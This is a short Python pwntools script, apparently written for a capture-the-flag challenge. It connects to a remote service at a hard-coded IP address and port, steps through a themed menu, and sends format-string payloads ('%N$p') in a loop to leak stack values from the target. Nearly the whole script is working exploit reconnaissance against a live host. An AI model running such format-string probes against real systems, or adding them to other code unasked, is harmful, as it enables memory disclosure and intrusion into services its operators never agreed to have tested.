from pwn import *

#context.log_level = 'debug'

def detect(io):
	for i in range(100):
		io.recvuntil('2. Space food')
		io.sendline( '1')
		io.recvuntil('3. Deathstar(70.00 s.rocks)')
		io.sendline('2')
		io.recvuntil('Red or Green Kryptonite?')
		io.sendline('%'+str(i+1)+'$p')
		buf = io.recvuntil('\n').strip()
		print(str(i+1)+' : '+buf)

ip, port = '142.93.34.45', 30123
io = remote(ip, port)

detect(io)
